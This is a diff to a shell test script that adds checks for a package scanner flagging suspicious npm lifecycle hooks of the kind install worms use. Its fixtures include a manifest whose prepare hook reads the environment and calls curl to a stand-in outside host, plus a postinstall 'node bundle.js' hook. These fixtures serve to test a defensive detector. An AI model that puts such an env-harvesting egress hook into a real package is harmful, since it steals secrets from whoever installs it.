@@ -234,6 +234,25 @@ assert data["score"] >= 40
    || check "--json package parseable" "0" "1"
 
 
+# npm lifecycle-hook risk (Shai-Hulud-style install worms)
+mkdir -p /tmp/hlse_hooktest.$$
+printf '%s\n' '{"scripts":{"postinstall":"node bundle.js"},"dependencies":{"lodash":"4.17.21"}}' \
+    > /tmp/hlse_hooktest.$$/package.json
+./hlse_core package --manifest /tmp/hlse_hooktest.$$/package.json 2>&1 | grep -q "suspicious lifecycle hook" \
+    && check "manifest: 'node bundle.js' postinstall hook flagged" "0" "0" \
+    || check "manifest: 'node bundle.js' postinstall hook flagged" "0" "1"
+printf '%s\n' '{"scripts":{"prepare":"node -e \"x\" && process.env && curl https://e.t/c"},"dependencies":{"lodash":"4.17.21"}}' \
+    > /tmp/hlse_hooktest.$$/package.json
+./hlse_core package --manifest /tmp/hlse_hooktest.$$/package.json 2>&1 | grep -q "suspicious lifecycle hook" \
+    && check "manifest: env-harvest+egress prepare hook flagged" "0" "0" \
+    || check "manifest: env-harvest+egress prepare hook flagged" "0" "1"
+printf '%s\n' '{"scripts":{"postinstall":"node-gyp rebuild","prepare":"husky install"},"dependencies":{"lodash":"4.17.21"}}' \
+    > /tmp/hlse_hooktest.$$/package.json
+./hlse_core package --manifest /tmp/hlse_hooktest.$$/package.json 2>&1 | grep -q "0 typosquat" \
+    && check "manifest: legit hooks (node-gyp/husky) not flagged" "0" "0" \
+    || check "manifest: legit hooks (node-gyp/husky) not flagged" "0" "1"
+rm -rf /tmp/hlse_hooktest.$$
+
 # ─── paste subcommand ──────────────────────────────────────────────
 
 # Safe command
